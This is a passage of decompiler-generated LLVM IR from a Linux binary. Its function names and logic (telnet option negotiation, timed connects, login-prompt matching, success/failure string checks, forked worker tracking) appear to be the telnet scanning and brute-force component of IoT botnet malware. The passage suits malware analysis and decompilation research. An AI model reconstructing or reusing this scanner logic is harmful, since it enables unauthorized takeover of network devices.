  %v1_80492e8 = icmp eq i1 %v4_80492e6, false
  br i1 %v1_80492e8, label %dec_label_pc_8049291, label %dec_label_pc_80492ea

dec_label_pc_80492ea:                             ; preds = %dec_label_pc_80492c1, %dec_label_pc_80492dc
  %stack_var_-32.1 = phi i8* [ %v22_80492cc, %dec_label_pc_80492c1 ], [ %stack_var_-32.0, %dec_label_pc_80492dc ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80492f9

dec_label_pc_80492f9:                             ; preds = %dec_label_pc_80492af, %dec_label_pc_80492ea
  %storemerge = phi i32 [ -1, %dec_label_pc_80492af ], [ %stack_var_-28.0, %dec_label_pc_80492ea ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v3_80492ff = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80492ff, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80492dc, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_80492cc, { 1, 0 }
  uselistorder i32 %v1_80491a8, { 2, 1, 0 }
  uselistorder i32 %v2_804918e, { 0, 3, 4, 5, 1, 2, 6, 7 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 %tmp19, { 0, 3, 1, 2 }
  uselistorder i32 %tmp15, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 19, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_80492f9, { 1, 0 }
  uselistorder label %dec_label_pc_80492ea, { 1, 0 }
  uselistorder label %dec_label_pc_80492dc, { 1, 0 }
  uselistorder label %dec_label_pc_8049282, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80491ec, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v1_804930d = add i32 %tmp1, 4
  %v2_804930d = inttoptr i32 %v1_804930d to i32*
  %v3_804930d = load i32, i32* %v2_804930d, align 4
  %v1_8049319 = call i32 @__GI_inet_ntoa(i32 %v3_804930d)
  ret i32 %v1_8049319
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8049326 = load i32, i32* @edi, align 4
  store i32 %v0_8049326, i32* %stack_var_-8, align 4
  %v1_8049330 = inttoptr i32 %tmp4 to i8*
  store i32 %tmp4, i32* @edi, align 4
  %v1_8049335 = and i32 %tmp4, -256
  %v5_8049337 = call i8* @_memset(i8* %v1_8049330, i32 %v1_8049335, i32 %tmp5)
  %v4_8049345 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp3, i32 %tmp4, i32 %tmp5)
  %v2_8049359 = inttoptr i32 %tmp to i32*
  %v3_8049359 = call i32 @contains_string(i32 %tmp4, i32* %v2_8049359)
  %v1_8049361 = icmp ne i32 %v3_8049359, 0
  %storemerge = zext i1 %v1_8049361 to i32
  %v3_8049378 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049378, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp4, { 4, 0, 1, 3, 2 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_80493a4 = ptrtoint i32* %stack_var_-144 to i32
  %tmp21 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_80493ab = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v2_80493b8 = udiv i32 %arg1, 32
  %v1_80493be = urem i32 %arg1, 32
  %v0_80493c1 = load i32, i32* @ebp, align 4
  %v2_80493c1 = mul nuw nsw i32 %v2_80493b8, 4
  %v3_80493c1 = add nsw i32 %v2_80493c1, -140
  %v4_80493c1 = add i32 %v3_80493c1, %v0_80493c1
  %v5_80493c1 = inttoptr i32 %v4_80493c1 to i32*
  %v6_80493c1 = load i32, i32* %v5_80493c1, align 4
  %v9_80493c1 = shl i32 1, %v1_80493be
  %v12_80493c1 = or i32 %v6_80493c1, %v9_80493c1
  store i32 %v12_80493c1, i32* %v5_80493c1, align 4
  %v1_80493cc = add i32 %arg1, 1
  %v2_80493d0 = ptrtoint i32* %stack_var_-152 to i32
  %v5_80493e3 = call i32 @__libc_select(i32 %v1_80493cc, i32 %v2_80493a4, i32 0, i32 0, i32 %v2_80493d0)
  %tmp22 = icmp slt i32 %v5_80493e3, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_80493fb, label %dec_label_pc_8049415

dec_label_pc_80493fb:                             ; preds = %entry
  %v4_8049407 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_8049415

dec_label_pc_8049415:                             ; preds = %entry, %dec_label_pc_80493fb
  %storemerge = phi i32 [ %v4_8049407, %dec_label_pc_80493fb ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049415, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v4_8049426 = icmp eq i32 %arg2, 0
  %v6_8049426 = trunc i32 %arg2 to i8
  %v1_804942a = icmp eq i1 %v4_8049426, false
  br i1 %v1_804942a, label %entry.dec_label_pc_804943d_crit_edge, label %dec_label_pc_804942c

entry.dec_label_pc_804943d_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804943d

dec_label_pc_804942c:                             ; preds = %entry
  %v2_804942f = load i32, i32* %arg1, align 4
  %v1_8049435 = call i32 @__libc_close(i32 %v2_804942f)
  br label %dec_label_pc_804943d

dec_label_pc_804943d:                             ; preds = %entry.dec_label_pc_804943d_crit_edge, %dec_label_pc_804942c
  %v1_8049440 = add i32 %tmp2, 16
  %v2_8049440 = inttoptr i32 %v1_8049440 to i32*
  store i32 0, i32* %v2_8049440, align 4
  %v3_804944f = add i32 %tmp2, 8
  %v4_804944f = inttoptr i32 %v3_804944f to i8*
  store i8 %v6_8049426, i8* %v4_804944f, align 1
  %v1_8049455 = add i32 %tmp2, 24
  %v2_8049455 = inttoptr i32 %v1_8049455 to i32*
  %v3_8049455 = load i32, i32* %v2_8049455, align 4
  %v3_8049466 = inttoptr i32 %v3_8049455 to i8*
  %v4_8049466 = call i32 @__GI_memset(i8* %v3_8049466, i32 0, i32 512)
  ret i32 %v4_8049466

; uselistorder directives
  uselistorder i32 %tmp2, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804943d, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804947e = inttoptr i32 %arg1 to i32*
  %v3_804947e = call i32 @advance_state(i32* %v2_804947e, i32 0)
  %v1_8049489 = add i32 %arg1, 9
  %v2_8049489 = inttoptr i32 %v1_8049489 to i8*
  store i8 1, i8* %v2_8049489, align 1
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v4_80494a0 = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_805b220.25 to i32*))
  ret i32 %v4_80494a0
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v4_80494bb = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_805b200.33 to i32*))
  ret i32 %v4_80494bb
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80494d1 = call i32 @contains_success(i32 %arg1)
  %v1_80494d9 = icmp eq i32 %v1_80494d1, 0
  %v1_80494db = icmp eq i1 %v1_80494d9, false
  br i1 %v1_80494db, label %dec_label_pc_80494ff, label %dec_label_pc_80494dd

dec_label_pc_80494dd:                             ; preds = %entry
  %v1_80494e3 = call i32 @contains_fail(i32 %arg1)
  %v1_80494eb = icmp ne i32 %v1_80494e3, 0
  %. = zext i1 %v1_80494eb to i32
  br label %dec_label_pc_80494ff

dec_label_pc_80494ff:                             ; preds = %dec_label_pc_80494dd, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_80494dd ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8049504 = load i32, i32* @ebp, align 4
  store i32 %v0_8049504, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804951f

dec_label_pc_804951f:                             ; preds = %dec_label_pc_804951f, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_804951f, %dec_label_pc_804951f ]
  %v4_804951f = add i32 %stack_var_-12.0, 1
  %v2_8049525 = mul i32 %v4_804951f, 4
  %v5_8049528 = add i32 %v2_8049525, %tmp5
  %v1_804952b = inttoptr i32 %v5_8049528 to i32*
  %v2_804952b = load i32, i32* %v1_804952b, align 4
  %v1_804952d = icmp eq i32 %v2_804952b, 0
  %v1_804952f = icmp eq i1 %v1_804952d, false
  br i1 %v1_804952f, label %dec_label_pc_804951f, label %dec_label_pc_8049564.preheader

dec_label_pc_8049564.preheader:                   ; preds = %dec_label_pc_804951f
  %v2_804954c = inttoptr i32 %arg1 to i8*
  %v5_804956a16 = icmp sgt i32 %v4_804951f, 0
  br i1 %v5_804956a16, label %dec_label_pc_804953a.lr.ph, label %dec_label_pc_8049573

dec_label_pc_804953a.lr.ph:                       ; preds = %dec_label_pc_8049564.preheader
  br label %dec_label_pc_804953a

dec_label_pc_804953a:                             ; preds = %dec_label_pc_804953a.lr.ph, %dec_label_pc_8049561
  %storemerge117 = phi i32 [ 0, %dec_label_pc_804953a.lr.ph ], [ %v4_8049561, %dec_label_pc_8049561 ]
  %v2_804953d = mul i32 %storemerge117, 4
  %v5_8049540 = add i32 %v2_804953d, %tmp5
  %v1_8049543 = inttoptr i32 %v5_8049540 to i32*
  %v2_8049543 = load i32, i32* %v1_8049543, align 4
  store i32 %v2_8049543, i32* @eax, align 4
  %v3_804954c = call i32 @strcasestr(i8* %v2_804954c, i32 %v2_8049543)
  %v1_8049554 = icmp eq i32 %v3_804954c, 0
  br i1 %v1_8049554, label %dec_label_pc_8049561, label %dec_label_pc_8049573

dec_label_pc_8049561:                             ; preds = %dec_label_pc_804953a
  %v4_8049561 = add nuw nsw i32 %storemerge117, 1
  %v5_804956a = icmp slt i32 %v4_8049561, %v4_804951f
  br i1 %v5_804956a, label %dec_label_pc_804953a, label %dec_label_pc_8049573

dec_label_pc_8049573:                             ; preds = %dec_label_pc_804953a, %dec_label_pc_8049561, %dec_label_pc_8049564.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_8049564.preheader ], [ 0, %dec_label_pc_8049561 ], [ 1, %dec_label_pc_804953a ]
  %v2_8049576 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049576, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32 %v4_804951f, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049573, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804953a, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_804957b = load i32, i32* @edi, align 4
  %v3_804958c = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049597 = or i32 %v3_804958c, 2048
  %v3_80495a9 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049597)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80495ba = urem i32 %arg3, 65536
  %v1_80495c3 = call i32 @htons(i32 %v1_80495ba)
  store i32 %arg2, i32* @edx, align 4
  %v3_80495dd = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_80495e5 = icmp eq i32 %v3_80495dd, 0
  br i1 %v1_80495e5, label %dec_label_pc_80495f8, label %dec_label_pc_80495e9

dec_label_pc_80495e9:                             ; preds = %entry
  br label %dec_label_pc_8049735

dec_label_pc_80495f8:                             ; preds = %entry
  %v2_80495d5 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049617 = call i32 @__libc_connect(i32 %arg1, i32 %v2_80495d5, i32 16)
  %v5_8049622 = icmp slt i32 %v3_8049617, 0
  %v1_8049626 = icmp eq i1 %v5_8049622, false
  br i1 %v1_8049626, label %dec_label_pc_80496fc, label %dec_label_pc_804962c

dec_label_pc_804962c:                             ; preds = %dec_label_pc_80495f8
  %v1_804962c = call i32 @__errno_location(i32 %v3_8049617)
  %v1_8049631 = inttoptr i32 %v1_804962c to i32*
  %v2_8049631 = load i32, i32* %v1_8049631, align 4
  %v9_8049633 = icmp eq i32 %v2_8049631, 115
  %v1_8049636 = icmp eq i1 %v9_8049633, false
  br i1 %v1_8049636, label %dec_label_pc_80496f0, label %dec_label_pc_804963c

dec_label_pc_804963c:                             ; preds = %dec_label_pc_804962c
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049659 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049659, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049660 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_804966d = udiv i32 %arg1, 32
  %v1_8049673 = urem i32 %arg1, 32
  %v0_8049676 = load i32, i32* @ebp, align 4
  %v2_8049676 = mul nuw nsw i32 %v2_804966d, 4
  %v3_8049676 = add nsw i32 %v2_8049676, -164
  %v4_8049676 = add i32 %v3_8049676, %v0_8049676
  %v5_8049676 = inttoptr i32 %v4_8049676 to i32*
  %v6_8049676 = load i32, i32* %v5_8049676, align 4
  %v9_8049676 = shl i32 1, %v1_8049673
  %v12_8049676 = or i32 %v6_8049676, %v9_8049676
  store i32 %v12_8049676, i32* %v5_8049676, align 4
  %v1_8049681 = add i32 %arg1, 1
  %v2_8049685 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8049698 = call i32 @__libc_select(i32 %v1_8049681, i32 0, i32 %v2_8049659, i32 0, i32 %v2_8049685)
  %tmp33 = icmp slt i32 %v5_8049698, 1
  br i1 %tmp33, label %dec_label_pc_80496e4, label %dec_label_pc_80496a4

dec_label_pc_80496a4:                             ; preds = %dec_label_pc_804963c
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80496b1 = ptrtoint i32* %stack_var_-180 to i32
  %v2_80496b8 = ptrtoint i32* %stack_var_-184 to i32
  %v5_80496c6 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80496b8, i32 %v2_80496b1)
  %v3_80496ce = load i32, i32* %stack_var_-184, align 4
  %v1_80496d4 = icmp eq i32 %v3_80496ce, 0
  br i1 %v1_80496d4, label %dec_label_pc_80496fc, label %dec_label_pc_80496d8

dec_label_pc_80496d8:                             ; preds = %dec_label_pc_80496a4
  br label %dec_label_pc_8049735

dec_label_pc_80496e4:                             ; preds = %dec_label_pc_804963c
  br label %dec_label_pc_8049735

dec_label_pc_80496f0:                             ; preds = %dec_label_pc_804962c
  br label %dec_label_pc_8049735

dec_label_pc_80496fc:                             ; preds = %dec_label_pc_80496a4, %dec_label_pc_80495f8
  %v3_8049706 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049711 = and i32 %v3_8049706, -2049
  %v3_8049723 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049711)
  br label %dec_label_pc_8049735

dec_label_pc_8049735:                             ; preds = %dec_label_pc_80496f0, %dec_label_pc_80496e4, %dec_label_pc_80496d8, %dec_label_pc_80495e9, %dec_label_pc_80496fc
  %v3_8049735 = phi i32 [ 0, %dec_label_pc_80496f0 ], [ 0, %dec_label_pc_80496e4 ], [ 0, %dec_label_pc_80496d8 ], [ 0, %dec_label_pc_80495e9 ], [ 1, %dec_label_pc_80496fc ]
  store i32 %v0_804957b, i32* @edi, align 4
  ret i32 %v3_8049735

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049735, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8049743 = load i32, i32* @ebx, align 4
  store i32 %v0_8049743, i32* %stack_var_-8, align 4
  %v1_8049747 = call i32 @__libc_fork(i32 %v0_8049743)
  %v4_804974f = icmp eq i32 %v1_8049747, 0
  %v1_8049753 = icmp eq i1 %v4_804974f, false
  br i1 %v1_8049753, label %dec_label_pc_8049760, label %dec_label_pc_8049755

dec_label_pc_8049755:                             ; preds = %entry
  br label %dec_label_pc_8049844

dec_label_pc_8049760:                             ; preds = %entry
  %v0_8049760 = load i32, i32* @global_var_805b528.34, align 8
  %v0_8049765 = load i32, i32* @global_var_805b52c.35, align 4
  %v1_804976b = add i32 %v0_8049760, 1
  %v5_804976b = icmp eq i32 %v0_8049760, -1
  %v2_804976e = zext i1 %v5_804976b to i32
  %v3_804976e = add i32 %v2_804976e, %v0_8049765
  store i32 %v1_804976b, i32* @global_var_805b528.34, align 8
  store i32 %v3_804976e, i32* @global_var_805b52c.35, align 4
  %v2_804978b = mul i32 %v1_804976b, 4
  %v1_804978e = add i32 %v2_804978b, 4
  %v1_8049795 = call i32 @malloc(i32 %v1_804978e)
  br label %dec_label_pc_80497cb

dec_label_pc_80497a9:                             ; preds = %dec_label_pc_80497cb, %dec_label_pc_80497fc
  %v2_80497ac = mul i32 %storemerge1, 4
  %v5_80497b1 = add i32 %v2_80497ac, %v1_8049795
  %v0_80497bc = load i32, i32* @global_var_80617b4.36, align 4
  %v2_80497c1 = add i32 %v0_80497bc, %v2_80497ac
  %v1_80497c4 = inttoptr i32 %v2_80497c1 to i32*
  %v2_80497c4 = load i32, i32* %v1_80497c4, align 4
  %v2_80497c6 = inttoptr i32 %v5_80497b1 to i32*
  store i32 %v2_80497c4, i32* %v2_80497c6, align 4
  %v4_80497c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_80497cb

dec_label_pc_80497cb:                             ; preds = %dec_label_pc_8049760, %dec_label_pc_80497a9
  %storemerge1 = phi i32 [ %v4_80497c8, %dec_label_pc_80497a9 ], [ 0, %dec_label_pc_8049760 ]
  %v0_80497d9 = load i32, i32* @global_var_805b528.34, align 8
  %v0_80497de = load i32, i32* @global_var_805b52c.35, align 4
  %v4_80497e8 = icmp ne i32 %v0_80497d9, 0
  %v2_80497eb = zext i1 %v4_80497e8 to i32
  %v3_80497eb = add i32 %v0_80497de, -1
  %v4_80497eb = add i32 %v3_80497eb, %v2_80497eb
  store i32 %v4_80497eb, i32* @ebx, align 4
  %v10_80497f7 = icmp eq i32 %v4_80497eb, 0
  br i1 %v10_80497f7, label %dec_label_pc_80497fc, label %dec_label_pc_80497a9

dec_label_pc_80497fc:                             ; preds = %dec_label_pc_80497cb
  %v1_80497e8 = add i32 %v0_80497d9, -1
  %v10_8049807 = icmp ult i32 %storemerge1, %v1_80497e8
  br i1 %v10_8049807, label %dec_label_pc_80497a9, label %dec_label_pc_804980c

dec_label_pc_804980c:                             ; preds = %dec_label_pc_80497fc
  %v2_8049817 = mul i32 %v0_80497d9, 4
  %v5_804981a = add i32 %v1_8049795, -4
  %v1_804981d = add i32 %v5_804981a, %v2_8049817
  store i32 %v1_804981d, i32* @edx, align 4
  %v2_8049823 = inttoptr i32 %v1_804981d to i32*
  store i32 %v1_8049747, i32* %v2_8049823, align 4
  %v0_8049825 = load i32, i32* @global_var_80617b4.36, align 4
  %v1_804982e = call i32 @free(i32 %v0_8049825)
  store i32 %v1_8049795, i32* @global_var_80617b4.36, align 4
  store i32 %v1_8049747, i32* @ecx, align 4
  br label %dec_label_pc_8049844

dec_label_pc_8049844:                             ; preds = %dec_label_pc_8049755, %dec_label_pc_804980c
  %v3_8049847 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049847, i32* @ebx, align 4
  ret i32 %v1_8049747

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_80497ac, { 1, 0 }
  uselistorder i32 %v1_8049795, { 2, 0, 1 }
  uselistorder i32 %v0_8049760, { 1, 0 }
  uselistorder label %dec_label_pc_8049844, { 1, 0 }
  uselistorder label %dec_label_pc_80497cb, { 1, 0 }
  uselistorder label %dec_label_pc_80497a9, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804984c = load i32, i32* @ebp, align 4
  store i32 %v0_804984c, i32* %stack_var_-4, align 4
  %v1_8049855 = add i32 %arg2, 1
  %v1_8049856 = inttoptr i32 %v1_8049855 to i8*
  %v2_8049856 = load i8, i8* %v1_8049856, align 1
  %v5_8049856 = and i32 %v1_8049855, -256
  %v9_8049862 = icmp ult i8 %v2_8049856, -5
  br i1 %v9_8049862, label %dec_label_pc_8049942, label %dec_label_pc_804986f

dec_label_pc_804986f:                             ; preds = %entry
  %v7_8049876 = icmp eq i8 %v2_8049856, -1
  br i1 %v7_8049876, label %dec_label_pc_8049878, label %dec_label_pc_8049892

dec_label_pc_8049878:                             ; preds = %dec_label_pc_804986f
  br label %dec_label_pc_8049942

dec_label_pc_8049892:                             ; preds = %dec_label_pc_804986f
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_804989d = ptrtoint i32* %stack_var_-5 to i32
  %v4_80498a4 = call i32 @__libc_send(i32 %arg1, i32 %v2_804989d, i32 1, i32 16384)
  %v2_80498b0 = load i8, i8* %v1_8049856, align 1
  %v11_80498b2 = icmp eq i8 %v2_80498b0, -4
  %v1_80498b4 = icmp eq i1 %v11_80498b2, false
  br i1 %v1_80498b4, label %dec_label_pc_80498bc, label %dec_label_pc_80498b6

dec_label_pc_80498b6:                             ; preds = %dec_label_pc_8049892
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_80498bc:                             ; preds = %dec_label_pc_8049892
  %v2_80498c0 = load i8, i8* %v1_8049856, align 1
  %v11_80498c2 = icmp eq i8 %v2_80498c0, -2
  %v1_80498c4 = icmp eq i1 %v11_80498c2, false
  br i1 %v1_80498c4, label %dec_label_pc_80498cc, label %dec_label_pc_80498c6

dec_label_pc_80498c6:                             ; preds = %dec_label_pc_80498bc
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_80498cc:                             ; preds = %dec_label_pc_80498bc
  %v2_80498d0 = load i8, i8* %v1_8049856, align 1
  %v10_80498d2 = icmp eq i8 %v2_80498d0, 3
  %v1_80498d4 = icmp eq i1 %v10_80498d2, false
  %v11_80498f8 = icmp eq i8 %v2_80498d0, -3
  %v1_80498fa = icmp eq i1 %v11_80498f8, false
  br i1 %v1_80498d4, label %dec_label_pc_80498f2, label %dec_label_pc_80498d6

dec_label_pc_80498d6:                             ; preds = %dec_label_pc_80498cc
  %. = select i1 %v1_80498fa, i32 253, i32 251
  %v7_80498ea = or i32 %., %v5_8049856
  store i32 %v7_80498ea, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_80498f2:                             ; preds = %dec_label_pc_80498cc
  %.2 = select i1 %v1_80498fa, i32 254, i32 252
  %v5_8049906 = load i32, i32* @edx, align 4
  %v6_8049906 = and i32 %v5_8049906, -256
  %v7_8049906 = or i32 %v6_8049906, %.2
  store i32 %v7_8049906, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_804990c:                             ; preds = %dec_label_pc_80498d6, %dec_label_pc_80498c6, %dec_label_pc_80498b6, %dec_label_pc_80498f2
  %v4_804991a = call i32 @__libc_send(i32 %arg1, i32 %v2_804989d, i32 1, i32 16384)
  %v1_8049925 = add i32 %arg2, 2
  %v4_8049933 = call i32 @__libc_send(i32 %arg1, i32 %v1_8049925, i32 1, i32 16384)
  %v2_8049945.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049942

dec_label_pc_8049942:                             ; preds = %dec_label_pc_8049878, %dec_label_pc_804990c, %entry
  %v2_8049945 = phi i32 [ %v0_804984c, %dec_label_pc_8049878 ], [ %v2_8049945.pre, %dec_label_pc_804990c ], [ %v0_804984c, %entry ]
  store i32 %v2_8049945, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049942, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804990c, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8049955 = ptrtoint i8* %arg1 to i32
  %v3_8049966 = call i32 @_strlen(i8* %arg1)
  %v4_8049966 = mul i32 %v3_8049966, -1
  %v1_804996c = sub i32 0, %v4_8049966
  %v6_8049993 = sub i32 %v4_8049955, %v4_8049966
  br label %dec_label_pc_8049a15

dec_label_pc_8049983:                             ; preds = %dec_label_pc_80499d3, %dec_label_pc_80499bc, %dec_label_pc_80499a5, %dec_label_pc_804998e
  %v4_8049983 = add nsw i32 %stack_var_-12.026, 1
  %v7_804998c = icmp slt i32 %v4_8049983, %v1_804996c
  br i1 %v7_804998c, label %dec_label_pc_804998e, label %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge

dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge: ; preds = %dec_label_pc_8049983, %dec_label_pc_8049986.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049986.preheader ], [ %v4_8049983, %dec_label_pc_8049983 ]
  %.pre = sub i32 %v6_8049993, %stack_var_-12.0.lcssa
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_80499ea

dec_label_pc_804998e:                             ; preds = %dec_label_pc_8049986.preheader, %dec_label_pc_8049983
  %stack_var_-12.026 = phi i32 [ %v4_8049983, %dec_label_pc_8049983 ], [ %stack_var_-12.1, %dec_label_pc_8049986.preheader ]
  %v2_804999b = sub i32 %v6_8049993, %stack_var_-12.026
  %v1_804999f = inttoptr i32 %v2_804999b to i8*
  %v2_804999f = load i8, i8* %v1_804999f, align 1
  %v4_80499a1 = icmp eq i8 %v2_804999f, 0
  br i1 %v4_80499a1, label %dec_label_pc_8049983, label %dec_label_pc_80499a5

dec_label_pc_80499a5:                             ; preds = %dec_label_pc_804998e
  %v2_80499b6 = load i8, i8* %v1_804999f, align 1
  %v7_80499b8 = icmp eq i8 %v2_80499b6, 32
  br i1 %v7_80499b8, label %dec_label_pc_8049983, label %dec_label_pc_80499bc

dec_label_pc_80499bc:                             ; preds = %dec_label_pc_80499a5
  %v2_80499cd = load i8, i8* %v1_804999f, align 1
  %v10_80499cf = icmp eq i8 %v2_80499cd, 13
  br i1 %v10_80499cf, label %dec_label_pc_8049983, label %dec_label_pc_80499d3

dec_label_pc_80499d3:                             ; preds = %dec_label_pc_80499bc
  %v2_80499e4 = load i8, i8* %v1_804999f, align 1
  %v10_80499e6 = icmp eq i8 %v2_80499e4, 10
  br i1 %v10_80499e6, label %dec_label_pc_8049983, label %dec_label_pc_80499ea

dec_label_pc_80499ea:                             ; preds = %dec_label_pc_80499d3, %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge
  %stack_var_-12.022 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge ], [ %stack_var_-12.026, %dec_label_pc_80499d3 ]
  %v1_80499fb.pre-phi = phi i8* [ %.pre10, %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge ], [ %v1_804999f, %dec_label_pc_80499d3 ]
  %v2_80499fb = load i8, i8* %v1_80499fb.pre-phi, align 1
  %v6_8049a00 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_8057f3c.37 to i32)
  %v1_8049a03 = inttoptr i32 %v6_8049a00 to i8*
  %v2_8049a03 = load i8, i8* %v1_8049a03, align 1
  %v15_8049a05 = icmp eq i8 %v2_80499fb, %v2_8049a03
